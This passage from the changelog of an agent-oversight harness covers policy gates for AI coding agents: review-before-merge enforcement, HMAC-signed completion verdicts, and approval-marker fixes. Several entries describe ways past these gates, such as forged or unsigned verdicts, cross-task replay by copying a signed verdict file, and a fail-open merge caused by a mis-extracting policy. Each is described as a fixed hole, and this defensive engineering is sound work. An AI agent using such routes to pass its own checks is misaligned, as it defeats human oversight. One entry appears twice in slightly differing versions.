- **`workflows:` gets its first slice of runtime enforcement: a `review_subagent` step with `spawn: "required"` followed by a `merge` step now derives a real merge-time gate, closing the v0.7.0 note that runtime enforcement was a follow-up** (task `99f47307`, Slice 1). `src/runtime/workflow-policies.ts#deriveWorkflowGatePolicies` is a pure function `src/cli/loader.ts#loadManifest` calls right after parse: for every workflow whose steps match that shape, and only when `manifest.hooks[]` declares BOTH `require-review-evidence` and `require-review-evidence-bash` (the pair `harness init --template full` already hand-authors, `src/cli/init/templates.ts`), it appends the byte-identical `review-before-merge` / `review-before-merge-bash` policy pair to `manifest.policies`, renamed `workflow:<name>:...` for provenance. Every `loadManifest` caller inherits this with no `harness apply` round-trip: the real `harness policy intercept` entrypoint (`src/cli/policy/intercept.ts`), `harness list policies`, `harness explain[-policy]`, and `harness doctor`. A hand-authored policy on the same trigger surface (event/match/bash_match) + `requires.ledger_tag` that extracts the same template variables and is at least as strong (`enforcement: block`, no `when:`, not `operator_only`) stands in for the derived gate and nothing is derived for that surface; so does a gate an earlier qualifying workflow in the same manifest already derived. A weaker or differently-extracting hand-authored policy does NOT suppress the derivation: both apply, and `harness validate`/`doctor` name the overlap (see review rounds 2 and 3 below). Fail direction: when the two evidence hooks are NOT wired the derivation returns nothing (never an unenforceable policy pointing at a hook that doesn't exist), closed by a new `error`-severity `harness validate` check, `checkWorkflowGateWiring`, so "declared `spawn: required`, gate never wired" cannot pass silently. The same CLI entrypoint runs on both adapters (`harness policy intercept`; `loadManifest` carries no runtime branching), so a Codex install that wires these hooks inherits the derived policies; not separately exercised — `docs/okf/codex-adapter-parity-gaps.md` gap 8 documents partial, de-facto Codex accommodation in the intercept engine (cwd resolution from the Codex sandbox argv), not a verified parity claim for this specific derivation. Scoped: only the `review_subagent (required) -> merge` pairing is enforced; PR-open gating driven by `workflows:` itself (today only reachable via the separate hand-authored `review-subagent-before-pr-create` / `-bash` policies), step-ordering validation, and `when.task_label`/project-based workflow selection remain schema-only and are left to a follow-up slice. `docs/for-agents.md` updated to describe the scoped, hook-dependent, process-gate-not-hostile-agent-safe behavior in place of the old "schema cannot enforce that today" line.
  ...
  **Review round 3** (same task, before this line shipped) fixed the
  remaining findings and closed the CLASS rounds 1 and 2 kept finding
  one member of ("one manifest reader sees the derived policies
  differently from another": round 1 `apply` vs `validate`, round 2 the
  two sides of `diff --since`). Every reader that parses a manifest now
  takes one of two views on purpose, documented as a table in
  `src/runtime/workflow-policies.ts`'s module doc and pinned by a new
  parity suite (`tests/cli/manifest-view-parity.test.ts`) that runs ONE
  on-disk manifest through every reader: the DERIVED view (hand-authored
  plus the workflow gate pair) for enforcement, validation, display, and
  comparisons where both sides are derived (`loadManifest`, `validate`,
  `doctor`, `list`, `describe`, `explain`, `dry-run`, `diff --since` on
  both sides, `add`'s asset gate, the `.last-apply` restart-hint
  comparison); the HAND-AUTHORED view for everything written out
  (`harness export`, the `.last-apply` manifest snapshot, the
  `add`/`remove`/`adopt`/`pack reseed` file rewrites and the schema gate
  in front of them). `withDerivedPolicies` and a new
  `withoutDerivedPolicies` are idempotent and accept either view as
  input, so a reader on the "wrong" side can no longer double-derive or
  strip a hand-authored policy.
  - **F1 (correctness, MEDIUM):** `findWeakGatePolicyOverlaps` re-ran the
    derivation walk WITHOUT its dedupe set, so a surface an equivalent
    hand-authored policy already covered (nothing derived) still warned,
    naming a `workflow:<name>:review-before-merge` policy that did not
    exist (`harness init --template full` plus a qualifying workflow:
    `validate` "0 errors, 1 warning", `doctor` 1 warning, `list policies`
    no `workflow:*` row). The overlap finder and the derivation are now
    two projections of ONE walk (`deriveWorkflowGates`), so they cannot
    disagree about what was derived; the full template plus a qualifying
    workflow yields zero workflow diagnostics.
  - **F2 (correctness, MEDIUM, repeated class):** `harness diff --since
    <ref>` parsed the ref side without the derived policies while the
    working side came from `loadManifest`, so an unchanged manifest with
    a qualifying workflow diffed as `+ policies[workflow:<name>:review-
    before-merge(-bash)]` on every run. Both sides now take the derived
    view (not both stripped): `diff` is an effective-config diff, the
    same reason override layers are merged on both sides, so flipping a
    review step from `spawn: optional` to `required` since the ref shows
    the gate it adds, and an unchanged manifest diffs clean.
  - **F3 (correctness, MEDIUM):** `harness remove hook
    require-review-evidence --force` printed no warning at all: the
    round-2 `derivedGateReferences` was only populated on the dry-run
    path, hard-coded `[]` on the write path, and never rendered by the
    CLI on either. It is now populated on both paths and the CLI prints
    `(forced removal disables the workflows[]-derived merge gate for:
    <workflows>; ...)` on stderr for `--dry-run --force` and for the
    real `--force` write.
  - **F4 (security, LOW):** `trigger.extract` was not part of the dedupe
    key, so a hand-authored block policy on the derived surface that
    extracted `PR_NUMBER` from a wrong path counted as equivalent,
    suppressed the derived gate, and evaluated its own
    `review:${PR_NUMBER}` against an unresolved variable; under
    `risk.degraded_fail_posture: fail_open` the merge went through with
    "template variables unresolved". A differently-extracting policy no
    longer dedupes (both gates apply, fail-safe) and the overlap warning
    names the mismatch (`trigger.extract differs (...)`).
  - **F5 (docs, LOW):** `docs/okf/debug-verb-selection.md` cited
    `docs/for-agents.md` line 249 for the `dry-run` row; that is the
    table separator since the round-2 wording landed, the row is line
    258. Re-pointed and re-stamped.
  - **F6 (docs, LOW):** the round-1 paragraph above still described the
    original surface-key-only dedupe ("does not double-intercept"),
    contradicting the round-2 F1 bullet; corrected in place.
  - **F7 (tests, LOW):** the `when:`-scoped and `operator_only` weakness
    reasons of the overlap finder were untested; two cases now assert the
    exact `reason` (the `operator_only` branch is unreachable from a
    parsed manifest, which the schema forbids together with `requires:`,
    and is pinned via a hand-built policy object).
  - **F8 (maintainability, LOW):** the duplication pin stays at 111
    (round 2's raise, accepted); this round adds no clone (`doctor`'s
    Workflows section now calls the same `checkWorkflows` aggregate
    `validate` runs instead of re-listing the checks, which also gives
  ...
  - Residuals, named rather than fixed: (a) the `.last-apply` manifest
    ...
    release without the derivation compares equal and emits no phantom
    "hooks changed" hint (a derivation-logic change between releases is
    therefore invisible to restart hints, by design: derived policies
    do not touch `settings.json`); (b) `harness export` emits the
    operator-declared manifest without the derived pair, `docs/CLI.md`
    now says so and points at `list policies`; (c) the round-2 F4
...
- **The `solution-acceptance` policy pack's verdict marker is now HMAC-signed, reusing the SAME `signMarker` / `verifyMarkerSignature` primitive the understanding-gate approval marker (and its branch-protection twin) shipped in v0.41.0 (task `f9485cc7`) — this is the "solution-acceptance's verdict marker remains unsigned" residual that entry's own follow-up note tracked separately** (task `c7c3f606`, pattern + exemplar). `evaluateGate` (`src/policy-packs/builtin/solution-acceptance-runtime.ts`) now verifies the verdict's signature BEFORE trusting `ready`/`head` at all: the signed payload mirrors the approval marker's `(approvedAt, approvedBy, reportContentHash)` shape onto the verdict's own fields — `timestamp` plays `approvedAt`, `source` plays `approvedBy`, and a sha256 content hash of `head`/`ready`/`confidence`/`blockers` plays `reportContentHash` — so tampering ANY of those fields post-signing invalidates the signature, not just editing `signature` itself. `harness pack hook solution-acceptance` REJECTS a verdict with a missing or invalid signature: `allowed:false`, same as no verdict at all, but with a distinct `forged/unsigned solution-acceptance verdict rejected` reason (new `GateResult.forged` field) so an operator/auditor can tell an active forgery attempt (or a not-yet-signing producer) apart from the routine "no verdict yet" / "not ready yet" cases. **Back-compat is strict, no migration window**, the SAME trade-off f9485cc7 made: a verdict with no `signature` field is rejected exactly like a forgery.
  - **Honest residual (read before assuming more than it delivers): this is CONSUMER-SIDE ONLY.** Unlike the understanding-gate marker, harness does not WRITE the solution-acceptance verdict — the producer is `@lannguyensi/grounding-mcp`, a separate package/repo. This task shipped the pattern + exemplar (`signVerdict` / `verifyVerdictSignature`, exported from `solution-acceptance-runtime.ts`, are the reusable pair a producer-side change mirrors) but **no currently-released grounding-mcp version signs its output**. Concretely, until a matching producer release ships (a tracked cross-repo follow-up): every verdict this consumer reads is "unsigned" and the completion-gate denies it UNIVERSALLY, even a perfectly legitimate `ready:true` verdict at the correct HEAD; re-running `solution_evaluate` does not recover from this (the new verdict is unsigned too); `harness pause`, or temporarily disabling the pack, is the operator's interim recourse. grounding-mcp's own `solution_gate` does not yet enforce this signature either — only this harness consumer does, until the producer-side change closes that asymmetry. `docs/policy-packs/solution-acceptance.md` "Marker signing" spells this out in full. The persisted-report approval path (task `7402301d`) and the write-guard's glob-every-segment / interpreter-runtime-path-construction residual are UNCHANGED by this task and remain separately tracked.
  - New tests: `tests/policy-packs/solution-acceptance-runtime.test.ts` (sign/verify round-trip, forged/unsigned rejection distinct from no-marker, hand-written-marker-without-key forgery regression, one-tampered-signature-byte regression, tampering `ready` without touching `signature`, cross-id signature-replay rejection, signing-key-I/O-failure-not-classified-as-forged, and the golden-fixture tests updated to assert the real UNSIGNED 0.3.2/0.5.0 producer markers are now rejected while a locally-signed copy of the same content still gates correctly) and `tests/cli/pack-hook-solution-acceptance.test.ts` (the same forgery/tamper regressions exercised through the real hook entrypoint).
- **The `solution-acceptance` policy pack's verdict marker is now HMAC-signed, reusing the SAME `signMarker` / `verifyMarkerSignature` primitive the understanding-gate approval marker (and its branch-protection twin) shipped in v0.41.0 (task `f9485cc7`) — this is the "solution-acceptance's verdict marker remains unsigned" residual that entry's own follow-up note tracked separately** (task `c7c3f606`, pattern + exemplar). `evaluateGate` (`src/policy-packs/builtin/solution-acceptance-runtime.ts`) now verifies the verdict's signature BEFORE trusting `ready`/`head` at all: the signed payload mirrors the approval marker's `(approvedAt, approvedBy, reportContentHash)` shape onto the verdict's own fields — `timestamp` plays `approvedAt`, `source` plays `approvedBy`, and a sha256 content hash of `head`/`ready`/`confidence`/`blockers` plays `reportContentHash` — so tampering ANY of those fields post-signing invalidates the signature, not just editing `signature` itself. `harness pack hook solution-acceptance` REJECTS a verdict with a missing or invalid signature: `allowed:false`, same as no verdict at all, but with a distinct `forged/unsigned solution-acceptance verdict rejected` reason (new `GateResult.forged` field) so an operator/auditor can tell an active forgery attempt (or a not-yet-signing producer) apart from the routine "no verdict yet" / "not ready yet" cases. **Back-compat is strict, no migration window**, the SAME strict no-grace-period POLICY f9485cc7 made: a verdict with no `signature` field is rejected exactly like a forgery. (The RECOVERY shape differs, though — see the honest-residual bullet below.)
  - **Fix-round-2 (review R1 HIGH): cross-id replay via a verbatim file copy is now closed.** `verifyVerdictSignature` previously derived the HMAC markerId from `verdict.id` — a field read back out of the marker BODY, which an attacker controls simply by copying a validly-signed verdict file onto a DIFFERENT id's marker path (the body's `id` travels with the copy, unchanged). `evaluateGate` never compared `verdict.id` against the id it was actually checking, so a verbatim copy of one task's ready verdict onto a second task's path passed verification and ALLOWED the second task to complete. `verifyVerdictSignature` now takes the CALLER's id explicitly and derives the markerId from it, matching the load-bearing invariant `approval-signing.ts` already documents ("verification always recomputes the HMAC using the id the caller is checking, NOT one read back out of the marker body"); `evaluateGate` additionally rejects outright when `verdict.id !== id` (belt-and-braces — the signed payload does not cover `id` itself, so this catches a post-signing edit to that one field that the markerId fix alone would not).
  - **Fix-round-2 (review R1 LOW): the hook's STDERR diagnostic now consumes `GateResult.forged`.** `harness pack hook solution-acceptance` appends a short `[audit: forged/unsigned verdict marker rejected]` tag to its operator-facing diagnostic line specifically when `forged: true`, mirroring the `markerForgedNote` audit-tag pattern already used by `hook-pre-tool-use.ts` / `hook-branch-protection.ts` — previously `GateResult.forged` was computed but never read by any production code path.
  - **Fix-round-2 (review R1 LOW): a verdict missing `timestamp` or `source` is no longer misclassified as forged.** Those two fields map onto `verifyMarkerSignature`'s `approvedAt` / `approvedBy`; a blank one is a legitimately malformed marker (e.g. a producer bug), not necessarily an active forgery attempt. `evaluateGate` now carves the `"missing approvedAt"` / `"missing approvedBy"` verification reasons out of the generic forged bucket — fail-closed (`allowed: false`) either way, but `forged: false`, the same shape as the existing signing-key-unavailable carve-out.
  - **Fix-round-2b (review R2 MED, audit-fidelity): the missing-timestamp/missing-source carve-out above is now scoped to verdicts with NO signature at all.** As shipped, the carve-out fired on the verification REASON string alone, regardless of whether the verdict actually carried `alg`/`signature` fields — so a forger who mutated an otherwise VALIDLY-SIGNED verdict to blank its `timestamp` (or `source`) suppressed the `forged: true` audit tag entirely: `verifyMarkerSignature` checks `approvedAt`/`approvedBy` for blankness BEFORE ever comparing the signature, so the blanked-but-signed marker hit the same `"missing approvedAt"` reason as a genuinely never-signed one and inherited its `forged: false` classification. The block itself still held either way (`allowed: false` throughout — this was never a bypass), but the audit trail lied about what happened. `evaluateGate` now additionally requires `verdict.signature === undefined && verdict.alg === undefined` before granting the carve-out; a verdict that carries `alg`/`signature` but still hits the blank-field reason falls through to the generic `forged: true` bucket instead, since a signed field reading blank only happens via post-signing tampering. The genuinely-unsigned case (no `alg`/`signature` fields, blank `timestamp`/`source`) keeps its `forged: false` classification unchanged — that one remains a defensible "unsigned legacy marker" read, not an attack signal.
  - **Honest residual (read before assuming more than it delivers): this is CONSUMER-SIDE ONLY.** Unlike the understanding-gate marker, harness does not WRITE the solution-acceptance verdict — the producer is `@lannguyensi/grounding-mcp`, a separate package/repo. This task shipped the pattern + exemplar (`signVerdict` / `verifyVerdictSignature`, exported from `solution-acceptance-runtime.ts`, are the reusable pair a producer-side change mirrors) but **no currently-released grounding-mcp version signs its output**. Concretely, until a matching producer release ships (a tracked cross-repo follow-up): every verdict this consumer reads is "unsigned" and the completion-gate denies it UNIVERSALLY, even a perfectly legitimate `ready:true` verdict at the correct HEAD; re-running `solution_evaluate` does not recover from this (the new verdict is unsigned too); `harness pause`, or temporarily disabling the pack, is the operator's interim recourse. grounding-mcp's own `solution_gate` does not yet enforce this signature either — only this harness consumer does, until the producer-side change closes that asymmetry. `docs/policy-packs/solution-acceptance.md` "Marker signing" spells this out in full. **Unlike f9485cc7's residual, there is no operator-side command that resolves this one**: f9485cc7's producer and consumer live in this one repo, so a denied operator has a local one-command fix (`harness approve understanding` / `harness approve branch-protection`); here the producer is a separate package on its own release cadence, so nothing an operator runs today makes a verdict pass until that producer release ships. The persisted-report approval path (task `7402301d`) and the write-guard's glob-every-segment / interpreter-runtime-path-construction residual are UNCHANGED by this task and remain separately tracked.
  - New tests: `tests/policy-packs/solution-acceptance-runtime.test.ts` (sign/verify round-trip, forged/unsigned rejection distinct from no-marker, hand-written-marker-without-key forgery regression, one-tampered-signature-byte regression, tampering `ready` without touching `signature`, relabeled-body signature-replay rejection, a VERBATIM file-copy cross-id replay regression, an isolated `verdict.id !== id` pin independent of the markerId fix, a sanitize-collision regression (`"a:b"` vs `"a_b"` colliding on one file path), the two missing-timestamp/missing-source not-forged carve-outs (now exercised via a genuinely UNSIGNED marker), signing-key-I/O-failure-not-classified-as-forged, the golden-fixture tests updated to assert the real UNSIGNED 0.3.2/0.5.0 producer markers are now rejected while a locally-signed copy of the same content still gates correctly, and — fix-round-2b — a SIGNED-verdict-with-blanked-timestamp/source regression pinning `forged: true` (audit finding A8) plus a minimal-hand-written-marker negative control pinning `forged: false` (audit finding A7)) and `tests/cli/pack-hook-solution-acceptance.test.ts` (the same forgery/tamper/cross-id-replay regressions and the forged-audit-tag diagnostic, exercised through the real hook entrypoint, plus — fix-round-2b — the SIGNED-and-blanked-timestamp forged-tag regression, the `verdict.id !== id` cross-id-mismatch-with-a-still-valid-signature regression, and forged-tag negative controls on the not-ready and stale-head denial paths).
...
- **`init`'s MCP registration could mutate/read the WRONG `claude` CLI registry file under a non-default home, and treated an "already registered" outcome as a hard failure that blocked the settings.json migration** (task `fb3e4dce`, two reviewer findings on run `2026-07-18-init-mcp-wiring-claude-code`). Finding 2: `realClaudeMcpExec` (`src/io/claude-mcp.ts`) spawned the real `claude` CLI with no explicit `env`, so it inherited `process.env` verbatim — identical to `ensureMcpServers`'s own drift-read directory only when that directory happened to be the OS default (`~/.claude.json`). A non-default `homeDir`/`registryPath` override (e.g. `harness init --home`) made the live CLI spawn mutate/read a DIFFERENT registry file than the one `ensureMcpServers` had just compared `desired` against. Fixed by threading a new `configDir` through every verb wrapper to `exec`'s new third argument; `realClaudeMcpExec` now sets `CLAUDE_CONFIG_DIR` in the spawned child's env from it. **Correction (review round 2, task `fb3e4dce`): the original fix set `configDir = path.dirname(registryPath)` unconditionally, which on the DEFAULT resolution path is `~` itself (not the CLI's own actual default `CLAUDE_CONFIG_DIR` of `~/.claude`), so it silently redirected every OTHER config-dir-relative path the CLI resolves (e.g. registry backups landing in `<HOME>/backups` instead of `<HOME>/.claude/backups`) — `resolveMcpConfigDirOverride` (`src/io/claude-mcp.ts`) now emits `configDir` only when the resolution actually used a `CLAUDE_CONFIG_DIR`/`homeDir`/`registryPath` override, leaving the pure default path's real spawn with unmodified `process.env` inheritance; the same helper now also backs `uninstall`'s `claude mcp remove` call (`src/cli/uninstall/index.ts`), which previously threaded no `configDir` at all under a non-default `--home`.** A `claude mcp get` verification that merely timed out or hit a missing CLI (inconclusive, not a positive "absent") no longer overrides a File-verified already-exists match on its own (`addAndVerifyAlreadyExists`); the wizard's post-registration message now distinguishes freshly `add-json`-registered servers ("registered N ...") from verified-already-exists ones ("confirmed N ... already registered"), instead of reporting both as "registered". Finding 3: `ensureMcpServers` reported an `add-json` "already exists" outcome exactly like any other failure, even when the desired server genuinely IS registered (e.g. a registration this run's own registry-file read raced ahead of/missed) — the wizard's `allOk` gate then blocked the dead-`settings.json`-`mcpServers`-block migration even though the target state already held. `addAndVerifyAlreadyExists` now confirms an "already exists" outcome via `claude mcp get` + a fresh re-read of the same registry file (empirically verified: `claude mcp get`'s stdout is prose and does not expose the registered command/args, so the spec comparison uses the file, not `get`'s own output) — a verified, spec-matching registration is surfaced as `EnsureServerResult.verifiedAlreadyExists.matches: true`, which `wireClaudeMcp`'s `allOk` check now treats as success; an unverified or spec-mismatched one preserves the prior conservative behavior unchanged. New coverage in `tests/io/claude-mcp.test.ts` (configDir threaded to every verb across an add/replace/get sequence for a non-default home; matching-spec, mismatched-spec, and get-can't-find-it already-exists variants; a plain "added" outcome never calls `get`) and `tests/cli/init-interactive.test.ts` (end-to-end: a verified-matching already-exists still runs the settings.json migration and prints no failure warning; a verified-mismatched one skips migration and prints the same warning as before this fix). Review round 2 adds: a real `claude mcp add-json` spawn (a throwaway shim binary, never the operator's real CLI/registry) pinning that an explicit `configDir` wins over the parent process's own `CLAUDE_CONFIG_DIR` and that omitting it inherits `process.env` verbatim; pure-function coverage of `resolveMcpConfigDirOverride`'s default-vs-override decision; a `claude mcp remove` configDir-alignment pin for `uninstall` under both an explicit `--home` and the pure default; a timed-out-`get`-still-checks-the-file case; and verb-order plus message-wording pins on the two existing already-exists wizard tests.
- **The session-start preflight not-ready fail-log's default directory (`~/.harness/logs`) is now repo-wide test-isolation-safe instead of suite-local** (task `80f49922`, reviewer finding on `a48b9729`). `defaultFailLogDir()` called `os.homedir()` directly, so the throw-on-real-home-dir guard in `resolvePaths()` (`loader.ts:45-64`, already pinned by `tests/integration/operator-state-isolation.test.ts`) never covered this seam — only a suite-local `vi.mock("node:os")` pin in `preflight.test.ts` did, protecting the one caller that suite happened to know about, not any future test or child process. `defaultFailLogDir` now resolves via `resolvePaths()` (same idiom as `defaultReportsDir`'s caller in `approve/understanding.ts`), so a caller that forgets to inject `homeDir`/`configPath` now fails at the guard instead of silently writing into the operator's real home. Side effect fix: the fail-log dir now also respects `$HARNESS_HOME` and the legacy `~/.claude/` fallback instead of hardcoding `~/.harness/` regardless of the rest of the harness state's actual location (a pre-existing divergence from task `31fbf856`) — EXCEPT when `configPath` is injected without `homeDir`: `configPath` overrides the manifest path directly, so the log dir becomes `dirname(configPath)/logs` and does not route through home-dir resolution (or the `$HARNESS_HOME`/legacy tiers) at all in that case. The not-ready branch now catches only the guard's throw (`persistFailLog`'s own write failure already never throws, so it stays outside that try/catch) and folds it into the same `{ ok: false, reason }` shape a fail-log write failure already produces, so the SessionStart producer still never throws. New coverage in `tests/integration/operator-state-isolation.test.ts` (no `HARNESS_INTEGRATION_TESTS` opt-in, no subprocess spawn), all exercising `runSessionStartPreflight` directly: a no-injection negative control (asserts the guard blocks the write and the real `~/.harness/logs/` is byte-for-byte unchanged); a hermetic `homeDir`-injection case and a hermetic `configPath`-injection case (neither mocks `os` nor needs `HARNESS_ALLOW_REAL_GENERATED_DIR`, since an injected option bypasses the guard outright); a `$HARNESS_HOME` case (needs the `ALLOW_REAL` escape hatch to reach that precedence tier since neither `homeDir` nor `configPath` is injected, secured with the same real-`~/.harness/logs/`-unchanged assertion as the negative control); and a legacy `~/.claude/` fallback case, the only one of the five that mocks `node:os` — scoped to itself via `vi.doMock` + a dynamic re-import — because that precedence tier reads `os.homedir()` directly and has no LoaderOptions seam to override it. `preflight.test.ts`'s suite-local negative-control test is updated to assert the guard blocks the write; its `vi.mock("node:os")` pin stays in place as a second line of defense for every OTHER `os.homedir()` consumer in that suite (it no longer protects this one seam, which now fails closed independently of it).
- **Two not-ready preflight fail-logs written in the same millisecond practically never overwrite each other anymore** (task `a48b9729`). The fail-log filename's ISO timestamp has millisecond resolution, so a second persist within the same ms silently clobbered the first; filenames now carry a 4-hex random suffix (`preflight-<repo>-<timestamp>-<hex4>.json`), leaving a 1-in-65536 same-millisecond residual collision chance rather than a guarantee. Alongside (test-only): the preflight suite pins `os.homedir()` to a throwaway tmp home so a not-ready test that forgets to inject `logDir` can never write into the operator's real `~/.harness/logs` (with a negative-control test), plus rotation boundary tests (exactly 20 → no eviction; 21 → exactly the oldest evicted), hostile-repo-basename containment tests, and a multi-failing-checks cap/join pin.
- **`harness doctor`'s dead-`settings.json`-`mcpServers`-block check now honors `CLAUDE_CONFIG_DIR`** (task `f13c6fbd`, #423). The check read a fixed `<home>/.claude/settings.json`, so with a config-dir override it inspected a file Claude Code does not read. Resolution now mirrors `resolveClaudeUserRegistryPath`'s precedence (non-empty `CLAUDE_CONFIG_DIR` wins), the warning names the resolved path, and doctor gained an `envOverride` test knob so the dead-block tests stay hermetic against the operator's real environment. (This entry was itself backfilled by the first run of the new changelog-coverage gate below.)
...
- **`understanding-before-execution`'s `config.mode` (harness.yaml) was config-drift: it drove prose only, never enforcement** (task `5d73d78d`; fix landed in two rounds, the second a review fix-round closing three HIGH findings against the first). Live repro in an isolated home: `config.mode: grill_me`, an agent report with no `mode:` metadata field, `harness approve understanding` (stdin heredoc) → output read `validation: ✓ fast_confirm report passed structural checks` and persisted `"mode": "fast_confirm"`, silently skipping the `derivedTodos` / `acceptanceCriteria` / `priorArt` sections `grill_me` requires. Root cause, two independent sites: (1) the Claude-runtime `UserPromptSubmit`/`Stop` hooks are bins shipped by `@lannguyensi/understanding-gate` (`understanding-gate-claude-hook` / `understanding-gate-claude-stop`), invoked bare — no `UNDERSTANDING_GATE_MODE` env var — so the package's own env-then-marker-then-`fast_confirm`-default resolver always fell through to its default; (2) `persistStdinReport`'s gap-fill for a report with no declared mode hardcoded the literal `"fast_confirm"`.
  - Fix: mode resolution is now TWO functions with different contracts (`src/policy-packs/builtin/understanding-before-execution.ts`), not one. `resolveModeFromConfig()` — `config.mode` > default (`grill_me`), **never the env var** — drives the GENERATION path: `resolve()`/`buildHooks` (what `harness apply` bakes into `settings.json` + `instructions.md`) and `registry.ts`'s `resolveBuiltinDefaultConfig` (`harness doctor`'s UX-drift comparison, `harness pack reseed`). `resolveMode()` — `UNDERSTANDING_GATE_MODE` env > `config.mode` > default — is reserved for LIVE runtime consumers that resolve at invocation time with the real process environment available: `approve/understanding.ts`'s stdin-report gap-fill, and the Codex `UserPromptSubmit` injector (`harness pack hook codex-user-prompt-submit`). The first round shipped a single env-aware resolver for BOTH roles, which meant an operator's ambient `UNDERSTANDING_GATE_MODE` (exported for an unrelated one-off override, or left over from a previous shell) would silently override `config.mode` in the GENERATED artefact itself — persisting, frozen, until the next `apply`, and making `doctor`/`reseed` report drift that had nothing to do with `harness.yaml`. `buildHooks` still bakes the (now config-only) resolved mode into the two npm-backed Claude bin commands via the same env var (`wrapMode`), but omits the prefix entirely when the resolved mode already coerces to the package's own default (`fast_confirm`) — baking it unconditionally (the first round's behavior) made the package's own in-prompt `/grill` / "grill me" per-prompt escalation marker permanently dead, since the package's own resolver checks its env var before ever looking at the marker.
  - Fix: `harness approve understanding`'s stdin-report path now genuinely REFUSES the approval marker when the submitted report is rejected under the resolved mode (e.g. a `fast_confirm`-shaped report submitted against a `grill_me`-configured host) and no report matching this session id exists — no marker, no ledger tag, no report flip, unless `--force` (mirroring the pre-existing `priorArt`-validation short-circuit). The first round resolved the correct mode but a rejected stdin submission with no fallback report still fell through to a `{ skipped: true }` validation outcome (not `ok: false`), so the marker was written anyway — a config-drift-shaped hole reopened one call deeper than the one this task closes. A second review round (verification round 2) closed a further gap in the same guard: a sessionId-null pending report ADOPTED via the tolerant fallback (not a strict sessionId match) does not count as "matching this session id" either, so a rejected submission can no longer silently ride on an unrelated leftover report's already-valid content and get stamped with the live session's id.
  - `strict` has no upstream equivalent (the package's own mode type is two-valued); `toPackageMode()` coerces it to `grill_me` — the closest available rigor — only at that interop boundary, not inside harness's own `strict` semantics.
  - **Behavior change, corrected blast-radius statement (the first round's was inaccurate — it implied only an EXPLICITLY-configured non-`fast_confirm` host was affected):** the mode actually enforced now matches `config.mode` in all three cases — `config.mode: fast_confirm` (was already effectively `fast_confirm`, unaffected save for the marker-liveness fix above), `config.mode: grill_me` / `strict` (now genuinely enforced, was silently `fast_confirm`), **and no `config:` block / no `mode:` key at all** (now genuinely enforced at `grill_me`, the package default — this last case is the WIDEST blast radius of the three and was NOT called out by the first round's changelog entry: every unconfigured host is affected, not only hosts with an explicit setting). Previously-accepted reports missing `derivedTodos` / `acceptanceCriteria` / `priorArt` are now rejected until the agent supplies them, for any host in the latter two buckets.
  - New/updated coverage: `tests/policy-packs/resolve-mode.test.ts` (both resolvers' contracts, LOW-8/LOW-9 warning + normalisation fixes), `tests/policy-packs/expand.test.ts` and `tests/cli/apply/apply.test.ts` (generation-path env-independence, the omitted-prefix case), `tests/cli/approve-understanding.test.ts` and `tests/cli/approve-stdin-report.test.ts` (mode gap-fill end to end, the stdin-rejection marker-refusal enforcement + its `--force` escape hatch, the disabled-pack LOW-10 case), and a new suite-wide `tests/_helpers/scrub-ambient-env.ts` setup file (MEDIUM-5: an ambient `UNDERSTANDING_GATE_MODE` in the operator/CI shell no longer leaks into tests that don't explicitly set it).
- **`harness approve understanding` could persist a self-contradictory report: `approvalStatus: "approved"` alongside a stale `expiredAt` timestamp** (task `646b7b6a`, reviewer finding on `agent-grounding` `5120938c`, the harness-side twin of that repo's `withApprovalStatus` fix in PR #173). `rewriteReportApproved` (`src/cli/approve/understanding.ts`) rewrote `approvalStatus` to `"approved"` in place without clearing `expiredAt`; since `@lannguyensi/understanding-gate` 0.4.11 declared `expiredAt` in the report schema, the field survived the rewrite whenever an operator approved a report that `expirePersistedReport` (`understanding-before-execution-runtime.ts`) had previously expired. Not a gate bypass — enforcement only reads `approvalStatus` — but a data-integrity defect in the persisted audit record. Fix: `rewriteReportApproved` now `delete`s `expiredAt` from the parsed report before serializing, mirroring the package's own `withApprovalStatus` idiom. New test in `tests/cli/approve-understanding.test.ts` covers approving a report fixtured exactly as `expirePersistedReport` writes one (`approvalStatus: "expired"` + ISO `expiredAt`), asserting the key is absent after approval.

### Added

- **Release-pipeline guards: CI now fails fast when a commit since the last
  tag has no `[Unreleased]` changelog entry, and release.yml aborts instead
  of shipping an empty release body** (task `3ed3d333`). New
  `scripts/check-changelog-coverage.mjs` (`npm run
  check:changelog-coverage`, wired before Build in ci.yml in the
  check-no-only idiom) compares `git log <last-tag>..HEAD` against the
  `[Unreleased]` section: a commit counts as covered when the section cites
  one of its mechanical link tokens (an 8-hex task id from the commit
  message, the squash-merge `#PR` number, a GHSA advisory id, or the
  commit's own SHA); commits typed `test`/`docs`/`ci`/`style`/`refactor`/
  `chore` are skipped by a convention documented — with its limits — in the
  script header. Verified against the historical failure: a checkout of
  `5b7a36f` (pre-0.42.0) goes red with 14 uncovered commits (including the
  postcss HIGH advisory close), while this branch is green; the gate's
  first live run also caught the missing `f13c6fbd` doctor entry backfilled
  under Fixed above. release.yml additionally hard-stops after the awk
  extraction when `release_notes.md` came out empty or whitespace-only
  (the "tag pushed before converting [Unreleased]" failure mode), naming
  the missing `## [<version>]` section in the error.
